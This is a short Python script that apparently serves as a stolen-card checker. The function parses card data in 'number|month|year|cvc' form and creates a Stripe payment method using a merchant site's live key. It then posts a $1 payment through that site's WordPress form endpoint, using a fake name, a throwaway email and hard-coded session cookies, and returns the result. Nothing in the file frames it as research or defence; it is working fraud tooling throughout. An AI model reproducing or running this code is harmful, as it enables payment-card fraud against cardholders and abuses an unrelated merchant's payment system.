import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'pragma': 'no-cache',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F5a8597112f%3B+stripe-js-v3%2F5a8597112f%3B+card-element&referrer=https%3A%2F%2Fthinkbuildlaunch.com&time_on_page=72273&key=pk_live_51MMFRNBXrOEtPO1a7R0vah2Kima98L35pfgHf86z61QKmk9GkjKZ1zRna4osSKoyMJVvF68BYBBlsgoljUFNZ05C00QEHC5XfC'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'PHPSESSID': 'dbd15a426d703becd031b101aec746fd',
	    '__stripe_mid': '62c5f123-aabf-496d-b8b1-669ee21ba33934cea8',
	    '__stripe_sid': 'fd16a95b-5671-4b72-b854-2466dcc63987645492',
	}
	
	headers = {
	    'authority': 'thinkbuildlaunch.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'PHPSESSID=dbd15a426d703becd031b101aec746fd; __stripe_mid=62c5f123-aabf-496d-b8b1-669ee21ba33934cea8; __stripe_sid=fd16a95b-5671-4b72-b854-2466dcc63987645492',
	    'origin': 'https://thinkbuildlaunch.com',
	    'pragma': 'no-cache',
	    'referer': 'https://thinkbuildlaunch.com/sample/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1734402235332',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=81&_fluentform_5_fluentformnonce=daba724972&_wp_http_referer=%2Fsample%2F&names%5Bfirst_name%5D=Vinsmoke&names%5Blast_name%5D=Sanji&email=wixaras947%40ikowat.com&custom-payment-amount=1&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '5',
	}
	
	r2 = requests.post(
	    'https://thinkbuildlaunch.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())